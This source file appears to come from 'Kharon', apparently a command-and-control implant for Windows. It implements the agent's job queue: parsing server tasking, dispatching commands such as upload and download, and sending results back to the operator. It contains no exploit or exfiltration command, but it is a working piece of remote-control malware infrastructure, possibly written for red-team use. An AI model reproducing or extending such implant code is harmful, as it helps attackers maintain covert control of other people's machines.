#include <Kharon.h>

auto DECLFN Jobs::Create(
    _In_ PCHAR    UUID, 
    _In_ PPARSER  Parser
) -> PJOBS {
    PJOBS   NewJob = (PJOBS)Self->Hp->Alloc( sizeof( JOBS ) );
    PPARSER JobPsr = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );

    if ( !NewJob ) {
        return NULL;
    }
    
    ULONG Length = 0;
    PVOID Data   = Self->Psr->Bytes( Parser, &Length );

    KhDbg( "data at %p [%d bytes] to parse", Data, Length );
    INT3BRK

    Self->Psr->New( JobPsr, Data, Length );

    NewJob->ExitCode = -1;
    NewJob->State    = KH_JOB_PRE_START;
    NewJob->CmdID    = Self->Psr->Int16( JobPsr );
    NewJob->UUID     = UUID;
    NewJob->Psr      = JobPsr;
    NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, UUID );

    KhDbg( "adding job with uuid: %s and command id: %d", NewJob->UUID, NewJob->CmdID );

    if ( !List ) {
        List = NewJob;
    } else {
        PJOBS Current = List;
        while ( Current->Next ) {
            Current = Current->Next;
        }
        Current->Next = NewJob;
    }
    
    Count++;

    KhDbg( "total jobs: %d", Count );

    return NewJob;
}

auto DECLFN Jobs::Send(
    _In_ PPACKAGE PostJobs
) -> VOID {
    
    PJOBS Current = List;

    while ( Current ) {
        if ( 
            Current->State    == KH_JOB_RUNNING &&
            Current->ExitCode == EXIT_SUCCESS
        ) {
            KhDbg( "concatenating job: %s", Current->UUID );
            KhDbg( "data at %p [%d bytes]", Current->Pkg->Buffer, Current->Pkg->Length );

            Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
            Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
            Self->Pkg->Destroy( Current->Pkg );
            Current->State = KH_JOB_TERMINATE;
        } else if ( 
            Current->State    == KH_JOB_RUNNING && 
            Current->ExitCode != EXIT_SUCCESS   &&
            Current->ExitCode != -1
        ) {
            PCHAR Unknown  = "unknown error";
            PCHAR ErrorMsg = nullptr;
            ULONG Flags    = FORMAT_MESSAGE_ALLOCATE_BUFFER | 
                             FORMAT_MESSAGE_FROM_SYSTEM     | 
                             FORMAT_MESSAGE_IGNORE_INSERTS;
            
            ULONG MsgLen = Self->Krnl32.FormatMessageA(
                Flags, NULL, Current->ExitCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
                (LPSTR)&ErrorMsg, 0, NULL
            );

            MsgLen = MsgLen ? MsgLen : Str::LengthA( Unknown );

            ULONG PkgLen = MsgLen + 40 + sizeof( INT16 ) + sizeof( INT32 );

            Self->Pkg->Int32( PostJobs, PkgLen );

            Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
            Self->Pkg->Int16( PostJobs, KhError );
            Self->Pkg->Int32( PostJobs, Current->ExitCode );

            if ( MsgLen > 0 && ErrorMsg ) {
                Self->Pkg->Str( PostJobs, ErrorMsg );
            } else {
                Self->Pkg->Str( PostJobs, Unknown );
            }

            Self->Pkg->Destroy( Current->Pkg );
            Current->State = KH_JOB_TERMINATE;
        }
        
        Current = Current->Next;
    }
    
    Self->Pkg->Transmit( PostJobs, 0, 0 );

    return;
}

auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
    PJOBS Current  = List;
    PJOBS Previous = nullptr;

    while ( Current ) {
        if ( Current->State == KH_JOB_TERMINATE ) {
            PJOBS ToRemove = Current;
             
            if ( Previous ) {
                Previous->Next = Current->Next;
                Current        = Current->Next;
            } else {
                List    = Current->Next;
                Current = List;
            }
            
            // if ( ToRemove->Pkg ) {
            //     Self->Pkg->Destroy( ToRemove->Pkg );
            // }
            if ( ToRemove->Psr ) {
                Self->Psr->Destroy( ToRemove->Psr );
            }
            Self->Hp->Free( ToRemove, sizeof( JOBS ) );
            
            Count--;
        } else {
            Previous = Current;
            Current  = Current->Next;
        }
    }
}

auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
    PJOBS Current = List;

    while ( Current ) {
        if ( Current->State == KH_JOB_PRE_START ) {
            KhDbg( "executing task UUID : %s", Current->UUID );
            KhDbg( "executing command id: %d", Current->CmdID );

            if ( 
                Current->CmdID == TkUpload   ||
                Current->CmdID == TkDownload
            ) {
                // Current->Handle = Self->Krnl32.CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)&Execute, Current, 0, 0 );
            } else {
                Current->State    = KH_JOB_RUNNING;
                ERROR_CODE Result = Execute( Current );
                Current->ExitCode = Result;

                KhDbg( "job executed with exit code: %d", Current->ExitCode );
            }
            
        }
        Current = Current->Next;
    }
}

auto DECLFN Jobs::Execute(
    _In_ PJOBS Job
) -> ERROR_CODE {
    for ( INT i = 0; i < TSK_LENGTH; i++ ) {
        if ( Job->CmdID == Self->Tk->Mgmt[i].ID ) {
            return ( Self->Tk->*Self->Tk->Mgmt[i].Run )( Job );
        }
    }
    return -2; // KH_ERROR_INVALID_TASK_ID;
}

auto DECLFN Jobs::GetByUUID(
    _In_ PCHAR UUID
) -> PJOBS {
    PJOBS Current = List;
    while ( Current ) {
        if ( Str::CompareA( Current->UUID, UUID ) == 0 ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::GetByID(
    _In_ ULONG ID
) -> PJOBS {
    PJOBS Current = List;
    while ( Current ) {
        if ( Current->CmdID == ID ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::Remove(
    _In_ PJOBS Job
) -> BOOL {
    if ( !List ) return FALSE;
    
    if ( List == Job ) {
        List = Job->Next;
    } else {
        PJOBS Current = List;
        while ( Current->Next && Current->Next != Job ) {
            Current = Current->Next;
        }
        
        if ( Current->Next == Job ) {
            Current->Next = Job->Next;
        } else {
            return FALSE;
        }
    }
    
    Self->Hp->Free( Job, sizeof( JOBS ) );
    Count--;

    return TRUE;
}